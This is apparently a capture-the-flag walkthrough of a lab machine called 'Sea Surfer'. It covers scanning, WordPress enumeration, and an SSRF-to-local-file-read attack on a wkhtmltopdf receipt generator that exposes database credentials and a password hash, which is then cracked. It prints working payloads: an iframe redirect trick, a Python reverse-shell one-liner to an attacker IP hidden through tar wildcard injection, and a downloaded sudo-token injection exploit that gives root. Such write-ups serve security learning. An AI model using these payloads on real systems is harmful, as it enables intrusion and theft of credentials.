ip add: 10.10.104.133


rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-30641  5.0     https://vulners.com/cve/CVE-2021-30641
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2020-13950  5.0     https://vulners.com/cve/CVE-2020-13950
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|_      1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


gobuster:
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.php (Status: 403)
[ERROR] 2023/01/12 09:34:07 [!] Get http://10.10.104.133/evil.html: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/index.html (Status: 200)
/index.html (Status: 200)
/server-status (Status: 403)




Open the webpage in a browser and enable burp proxy:

intercepting the request to 10.10.104.133, we find an interesting parameter in the response body: X-Backend-Server: seasurfer.thm

add the seasurfer.thm to /etc/hosts file 

We have a new webiste powerd by wordpress.

using wpscan to enumerate users:
└─$ wpscan --url seasurfer.thm --enumerate u        
[i] User(s) Identified:

[+] kyle
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://seasurfer.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://seasurfer.thm/wp-json/oembed/1.0/embed?url=http://seasurfer.thm/&format=json
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://seasurfer.thm/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)


interesing info:
[+] robots.txt found: http://seasurfer.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php

 found wp login page:
 http://seasurfer.thm/wp-login.php
  

  using gobuster again on the website:
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/0 (Status: 301)
/a (Status: 301)
/A (Status: 301)
/about (Status: 301)
/About (Status: 301)
/admin (Status: 302)
/adminer 
/atom (Status: 301)
/b (Status: 301)
/B (Status: 301)
/bl (Status: 301)
/Blog (Status: 301)
/blog (Status: 301)
/c (Status: 301)
/C (Status: 301)
/co (Status: 301)
/coffee (Status: 301)
/comment-page-1 (Status: 301)
/con (Status: 301)
/contact (Status: 301)
/cont (Status: 301)
/Contact (Status: 301)
/dashboard (Status: 302)
/embed (Status: 301)
/favicon.ico (Status: 200)
/favicon.ico.html (Status: 200)
/favicon.ico.php (Status: 200)
/favicon.ico.txt (Status: 200)
/feed (Status: 301)
/h (Status: 301)
/H (Status: 301)
/home (Status: 301)
/Home (Status: 301)
/index.php (Status: 301)
/index.php (Status: 301)
/license.txt (Status: 200)
/login (Status: 302)
/n (Status: 301)
/N (Status: 301)
/ne (Status: 301)
/new (Status: 301)
/news (Status: 301)
/News (Status: 301)
/page1 (Status: 301)
/page2 (Status: 301)
/rdf (Status: 301)
/readme.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/s (Status: 301)
/S (Status: 301)
/sa (Status: 301)
/sale (Status: 301)
/sam (Status: 301)
/sample (Status: 301)
[ERROR] 2023/01/12 10:18:09 [!] Get http://seasurfer.thm/Scripts.html: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/01/12 10:18:09 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
[ERROR] 2023/01/12 10:18:10 [!] Get http://seasurfer.thm/search.php: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2023/01/12 10:18:10 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
/xmlrpc.php (Status: 200)
/xmlrpc.php (Status: 200)
===============================================================
2023/01/12 10:19:29 Finished
===============================================================



Browsing trouth the website, we find a comment:


Posted on April 16, 2022 by kyle
News

At Sea Surfer, we’re always riding the wave, and we are moving into the eCommerce space. That’s a fancy word for online shopping! Starting next month, you can buy your favorite boards and accessories straight from your computer and get straight to shredding!
One Reply to “News”

    brandon
    April 18, 2022 at 2:03 am	

    dude what was the site again where u could create receipts for customers? the computer is saying cant connect to intrenal.seasurfer.thm

    it mentions another website, but it contains a spelling error

    add the new site to /etc/hosts
    visit the website: On this website it seems to create a pdf receipt
    download a receipt and inspect it using exiftool
    it is created using: Creator                         : wkhtmltopdf 0.12.5

let's search for an exploit
http://hassankhanyusufzai.com/SSRF-to-LFI/

POC
add this to additional info: <img src=x onerror=document.write(1337)>

set up nc listener and then add this to add info: <img src="http://10.8.29.89:4444/>

receive a connection in form of HTTP request

create a surf.php file containg:
<?php

$loc = "http://127.0.0.1/";

if(isset($_GET['a'])){
    $loc = $_GET['a'];
}
header('Location: '.$loc);

?>

host the file using php -S 0.0.0.0:80

add this to add info in the website:

<iframe height=2000 width=50 src="http://10.8.29.89/surf.php?a=file:///etc/passwd">

now you can read /etc/hosts

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd
Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time
Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false


we see that we have kile user from WPscan

lets try to read /var/www/wordpress/wp-config.php

define( 'DB_USER', 'wordpressuser' );
DB_PASSWORD', 'coolDataTablesMan' 

use these credentials on /adminer -> we succesfuly log in to db site

going to worpress db, wp_users we find kyles credentials
kyle	$P$BuCryp52DAdCRIcLrT9vrFNb0vPcyi/
lets try to crack kyle's hash
john --wordlist=/usr/share/wordlists/rockyou.txt kyle_wphash 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jenny4ever       (?)     
1g 0:00:00:08 DONE (2023-01-12 10:55) 0.1114g/s 55909p/s 55909c/s 55909C/s jess0107..jello33
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

using kyle and jenny4ever we can log in to wp admin -> GREAT SUCCESS

now it's time to get a foothold

upload a php-reverse-shell to themes-editor file to 404 theme page , start a listener and then navigate to a non existing page in order to get a shell

we get a shell as www-data and we need to escalate to kyle user

www-data@seasurfer:/var/www/internal/maintenance$ cat backup.sh
cat backup.sh
#!/bin/bash

# Brandon complained about losing _one_ receipt when we had 5 minutes of downtime, set this to run every minute now >:D
# Still need to come up with a better backup system, perhaps a cloud provider?

cd /var/www/internal/invoices
tar -zcf /home/kyle/backups/invoices.tgz *

notice the wildcard
we can use : https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

go to invoices folder and :
www-data@seasurfer:/var/www/internal/invoices$

 echo $'/usr/bin/python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.29.89",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")\'' > shell.sh

www-data@seasurfer:/var/www/internal/invoices$ echo "" > "--checkpoint-action=exec=sh shell.sh"
<s$ echo "" > "--checkpoint-action=exec=sh shell.sh"
www-data@seasurfer:/var/www/internal/invoices$ echo "" > --checkpoint=1
echo "" > --checkpoint=1


start a listener on port 1234 to catch the shell

read user.txt: THM{SSRFING_TO_LFI_TO_RCE}


PRIV ESC:

run Linpeas"
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

found this exlpoit:
https://github.com/nongiach/sudo_inject




kyle@seasurfer:/tmp/usr/bin$ export PATH=$(pwd):$PATH
export PATH=$(pwd):$PATH
kyle@seasurfer:/tmp/usr/bin$ cd /home
cd /home
kyle@seasurfer:/home$ ls
ls
kyle
kyle@seasurfer:/home$ cd kyle
cd kyle
kyle@seasurfer:~$ wget http://10.8.29.89:8000/exploit_v2.sh
wget http://10.8.29.89:8000/exploit_v2.sh
--2023-01-12 16:53:25--  http://10.8.29.89:8000/exploit_v2.sh
Connecting to 10.8.29.89:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 493 [text/x-sh]
Saving to: ‘exploit_v2.sh’

exploit_v2.sh       100%[===================>]     493  --.-KB/s    in 0s      

2023-01-12 16:53:25 (23.6 MB/s) - ‘exploit_v2.sh’ saved [493/493]

kyle@seasurfer:~$ ls
ls
backups  exploit_v2.sh  snap  user.txt
kyle@seasurfer:~$ sh exploit_v2.sh
sh exploit_v2.sh
Creating suid shell in /tmp/sh
Current process : 30237
Injecting process 29977 -> sh
Injecting process 30173 -> sh
Injecting process 30176 -> sh
cat: /proc/30217/comm: No such file or directory
Injecting process 30217 -> 
cat: /proc/30218/comm: No such file or directory
Injecting process 30218 -> 
cat: /proc/30222/comm: No such file or directory
Injecting process 30222 -> 
cat: /proc/30223/comm: No such file or directory
Injecting process 30223 -> 
cat: /proc/30225/comm: No such file or directory
Injecting process 30225 -> 
cat: /proc/30226/comm: No such file or directory
Injecting process 30226 -> 
cat: /proc/30228/comm: No such file or directory
Injecting process 30228 -> 
cat: /proc/30229/comm: No such file or directory
Injecting process 30229 -> 
cat: /proc/30231/comm: No such file or directory
Injecting process 30231 -> 
cat: /proc/30232/comm: No such file or directory
Injecting process 30232 -> 
cat: /proc/30233/comm: No such file or directory
Injecting process 30233 -> 
cat: /proc/30235/comm: No such file or directory
Injecting process 30235 -> 
cat: /proc/30238/comm: No such file or directory
Injecting process 30238 -> 
kyle@seasurfer:~$ 


kyle@seasurfer:~$ ls -lpah /tmp/sh
ls -lpah /tmp/sh
-rwsr-sr-x 1 root root 127K Jan 12 16:53 /tmp/sh
kyle@seasurfer:~$ /tmp/sh -p
/tmp/sh -p
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
THM{STEALING_SUDO_TOKENS}
# 
